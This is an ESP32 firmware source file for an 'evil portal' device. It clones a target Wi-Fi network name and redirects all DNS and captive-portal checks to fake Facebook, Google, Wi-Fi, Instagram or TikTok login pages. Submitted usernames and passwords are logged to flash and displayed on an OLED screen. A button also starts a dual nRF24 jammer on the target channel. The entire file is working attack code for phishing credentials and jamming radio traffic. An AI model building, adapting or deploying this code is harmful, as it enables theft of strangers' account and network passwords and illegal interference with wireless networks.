#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <U8g2lib.h>
#include <RF24.h>
#include "FS.h"
#include "SPIFFS.h"
#include "app_config.h"
#include "portals.h"
#include "ui_theme.h"

// Variables externas definidas en main.cpp
extern String target_ssid; 
extern int target_channel;
extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
extern RF24 jam1;
extern RF24 jam2;
extern bool runningApp; // Necesaria para salir al menú principal

DNSServer dnsServer;
WebServer server(80);

int portal_choice = 0; 
bool portalRunning = false;
const char* selected_html;
String captured_data = "Esperando...";
int scrollY = 0; 
int maxScroll = 0;
bool isJammerActive = false;

// --- NUEVAS VARIABLES PARA SELECCIÓN DE SSID FALSO ---
const char* fallback_ssids[] = {"Wifi_Free", "Red_Abierta", "Starbucks_Clientes", "Wifi_Free_5G"};
int fallback_index = 0;
bool selectingFallback = false;

static const char* portal_labels[] = {
    "FACEBOOK", "GOOGLE", "WIFI NATIVO", "INSTAGRAM", "TIKTOK"
};

static void drawPortalGlyph(int x, int y, uint8_t frame) {
    u8g2.drawRFrame(x, y, 28, 24, 3);
    u8g2.drawVLine(x + 6, y + 5, 14);
    u8g2.drawHLine(x + 6, y + 5, 16);
    u8g2.drawHLine(x + 6, y + 19, 16);
    u8g2.drawCircle(x + 18, y + 12, 3 + (frame % 3));
    u8g2.drawPixel(x + 23, y + 12);
}

static void drawFallbackPicker(uint8_t frame) {
    (void)frame;
    UiTheme::drawHeader(u8g2, "EVIL PORTAL", "SSID");

    u8g2.setFont(u8g2_font_6x10_tr);
    UiTheme::drawCenteredText(u8g2, 24, "SIN OBJETIVO");
    u8g2.drawHLine(0, 27, 128);

    for (int i = 0; i < 4; i++) {
        int y = 36 + (i * 9);
        bool selected = (fallback_index == i);
        if (selected) {
            u8g2.drawBox(2, y - 8, 124, 9);
            u8g2.setDrawColor(0);
        }
        u8g2.setCursor(8, y);
        u8g2.print(fallback_ssids[i]);
        if (selected) u8g2.setDrawColor(1);
    }
}

static void drawPortalPicker(uint8_t frame) {
    (void)frame;
    char status[8];
    snprintf(status, sizeof(status), "%d/5", portal_choice + 1);
    UiTheme::drawHeader(u8g2, "PORTAL", status);

    u8g2.setFont(u8g2_font_5x7_tr);
    u8g2.setCursor(4, 22);
    u8g2.print("OBJ ");
    u8g2.print(target_ssid.substring(0, 17));
    u8g2.drawHLine(0, 25, 128);

    u8g2.setFont(u8g2_font_5x7_tr);
    for (int i = 0; i < 5; i++) {
        int y = 31 + (i * 8);
        bool selected = (portal_choice == i);
        if (selected) {
            u8g2.drawBox(2, y - 6, 124, 8);
            u8g2.setDrawColor(0);
        }
        u8g2.setCursor(8, y);
        u8g2.print(portal_labels[i]);
        if (selected) u8g2.setDrawColor(1);
    }
}

static void drawPortalActiveHeader(uint8_t frame) {
    char status[8];
    snprintf(status, sizeof(status), "V:%d", WiFi.softAPgetStationNum());
    UiTheme::drawHeader(u8g2, "PORTAL ACTIVO", status);
    UiTheme::drawMiniWave(u8g2, 3, 20, frame);
    UiTheme::drawMiniWave(u8g2, 116, 20, frame + 4);
}

#define BTN_ATTACK 27 

// --- FUNCIONES DE ATAQUE RF (Sin cambios) ---
void startJammer(int channel) {
    int rf_ch = (channel - 1) * 5 + 12;
    jam1.begin();
    jam1.setPALevel(RF24_PA_MAX);
    jam1.setDataRate(RF24_2MBPS);
    jam1.setChannel(rf_ch);
    jam1.startConstCarrier(RF24_PA_MAX, rf_ch);
    
    jam2.begin();
    jam2.setPALevel(RF24_PA_MAX);
    jam2.setDataRate(RF24_2MBPS);
    jam2.setChannel(rf_ch + 3); 
    jam2.startConstCarrier(RF24_PA_MAX, rf_ch + 3);
}

void stopJammer() {
    jam1.stopConstCarrier();
    jam2.stopConstCarrier();
}

void saveToLog(String email, String pass, String header) {
    if(!SPIFFS.begin(true)) return;
    File file = SPIFFS.open(AppConfig::LOG_FILE_PATH, FILE_APPEND);
    if(file) {
        file.println(header);
        if (portal_choice != 2) file.println("User: " + email);
        file.println("Pass: " + pass);
        file.println("Red: " + target_ssid + " (CH: " + String(target_channel) + ")");
        file.println("----------");
        file.close();
    }
}

void handleRoot() {
    server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    server.sendHeader("Pragma", "no-cache");
    server.sendHeader("Expires", "-1");
    server.send(200, "text/html", selected_html);
}

void handleCaptivePortal() {
    server.sendHeader("Location", String("http://") + WiFi.softAPIP().toString(), true);
    server.send(302, "text/plain", ""); 
}

void handleLogin() {
    String email = server.arg("email");
    String pass = server.arg("password");
    if (pass.length() > 0) {
        String log_header;
        if (portal_choice == 0) log_header = ">>> CAPTURA FACEBOOK";
        else if (portal_choice == 1) log_header = ">>> CAPTURA GOOGLE";
        else if (portal_choice == 2) log_header = ">>> CAPTURA WIFI";
        else if (portal_choice == 3) log_header = ">>> CAPTURA INSTAGRAM";
        else if (portal_choice == 4) log_header = ">>> CAPTURA TIKTOK";

        if (portal_choice == 2) {
            captured_data = "WIFI PASSWORD:\n" + pass + "\n\nRED:\n" + target_ssid;
        } else {
            captured_data = "USER:\n" + email + "\n\nPASS:\n" + pass;
        }
        scrollY = 0; 
        saveToLog(email, pass, log_header); 
        maxScroll = -84; 
        String successHtml = "<html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
                             "<style>body{font-family:sans-serif;text-align:center;padding:40px 20px;background:#f4f4f4;}"
                             ".box{background:white;padding:30px;border-radius:12px;box-shadow:0 4px 15px rgba(0,0,0,0.1);max-width:320px;margin:auto;}"
                             ".check{font-size:50px;color:#4CAF50;margin-bottom:10px;}</style></head>"
                             "<body><div class='box'><div class='check'>&#10004;</div>"
                             "<h2>¡Conexi&oacute;n exitosa!</h2>"
                             "<p>La verificaci&oacute;n se complet&oacute; correctamente. Su dispositivo se reconectar&aacute; automáticamente en unos instantes.</p>"
                             "</div><script>setTimeout(function(){ window.location.href='https://www.google.com'; }, 5000);</script></body></html>";
        server.send(200, "text/html", successHtml);
    }
}

void startPortal(int type) {
    if (type == 0) selected_html = html_facebook;
    else if (type == 1) selected_html = html_google;
    else if (type == 2) selected_html = html_wifi_native; 
    else if (type == 3) selected_html = html_instagram;
    else if (type == 4) selected_html = html_tiktok;

    WiFi.mode(WIFI_AP);
    WiFi.softAP(target_ssid.c_str(), NULL); 
    dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
    dnsServer.start(53, "*", WiFi.softAPIP());
    server.on("/generate_204", handleRoot);
    server.on("/check_generate_204", handleRoot);
    server.on("/hotspot-detect.html", handleRoot);
    server.on("/library/test/success.html", handleRoot);
    server.on("/success.txt", handleRoot);
    server.on("/", handleRoot);
    server.on("/login", HTTP_POST, handleLogin);
    server.onNotFound(handleCaptivePortal); 
    server.begin();
    portalRunning = true;
}

void evilPortalLoop() {
    static uint8_t uiFrame = 0;
    uiFrame++;

    if (target_ssid == "" || target_ssid == "Ninguna") {
        if (digitalRead(26) == LOW) { fallback_index--; if(fallback_index < 0) fallback_index = 3; delay(200); } 
        if (digitalRead(33) == LOW) { fallback_index++; if(fallback_index > 3) fallback_index = 0; delay(200); } 

        u8g2.clearBuffer();
        drawFallbackPicker(uiFrame);
        u8g2.sendBuffer();

        if (digitalRead(32) == LOW) { target_ssid = fallback_ssids[fallback_index]; delay(300); }
        if (digitalRead(25) == LOW) { runningApp = false; delay(300); }
        return; 
    }

    if (!portalRunning) {
        // --- CAMBIO: LÍMITE DE portal_choice AHORA ES 4 (5 OPCIONES) ---
        if (digitalRead(26) == LOW) { portal_choice--; if(portal_choice < 0) portal_choice = 4; delay(200); } 
        if (digitalRead(33) == LOW) { portal_choice++; if(portal_choice > 4) portal_choice = 0; delay(200); } 

        u8g2.clearBuffer();
        drawPortalPicker(uiFrame);
        u8g2.sendBuffer();

        if (digitalRead(32) == LOW) { startPortal(portal_choice); delay(400); }
        
        if (digitalRead(25) == LOW) { 
            for(int i=0; i<4; i++) { if(target_ssid == fallback_ssids[i]) target_ssid = "Ninguna"; }
            runningApp = false; delay(300); 
        }
    } else {
        dnsServer.processNextRequest();
        server.handleClient();

        if (digitalRead(26) == LOW) { scrollY += 4; if (scrollY > 0) scrollY = 0; delay(30); } 
        if (digitalRead(33) == LOW) { scrollY -= 4; if (scrollY < maxScroll) scrollY = maxScroll; delay(30); } 

        if (digitalRead(BTN_ATTACK) == LOW) {
            isJammerActive = !isJammerActive;
            if (isJammerActive) startJammer(target_channel);
            else stopJammer();
            delay(300);
        }

        u8g2.clearBuffer();
        drawPortalActiveHeader(uiFrame);

        u8g2.setFont(u8g2_font_5x7_tr);
        if (isJammerActive) {
            u8g2.drawBox(0, 54, 44, 10); u8g2.setDrawColor(0);
            u8g2.drawStr(3, 62, "ACTIVE"); u8g2.setDrawColor(1);
        } else {
            u8g2.drawFrame(0, 54, 44, 10); u8g2.drawStr(8, 62, "READY");
        }

        u8g2.setCursor(30, 22);
        u8g2.print("SSID ");
        u8g2.print(target_ssid.substring(0, 13));
        u8g2.drawLine(0, 24, 128, 24); 

        int currentY = 34 + scrollY;
        int lastPos = 0;
        int nextPos = captured_data.indexOf('\n');
        while (lastPos < captured_data.length()) {
            String line = (nextPos == -1) ? captured_data.substring(lastPos) : captured_data.substring(lastPos, nextPos);
            if (currentY > 26 && currentY < 54) { u8g2.setCursor(2, currentY); u8g2.print(line); }
            currentY += 12;
            if (nextPos == -1) break;
            lastPos = nextPos + 1;
            nextPos = captured_data.indexOf('\n', lastPos);
        }
        u8g2.sendBuffer();

        if (digitalRead(25) == LOW) { 
            stopJammer(); isJammerActive = false;
            captured_data = "Esperando..."; 
            portalRunning = false;
            server.stop(); dnsServer.stop();
            WiFi.softAPdisconnect(true);
            WiFi.mode(WIFI_OFF);
            for(int i=0; i<4; i++) { if(target_ssid == fallback_ssids[i]) target_ssid = "Ninguna"; }
            delay(300);
        }
    }
}
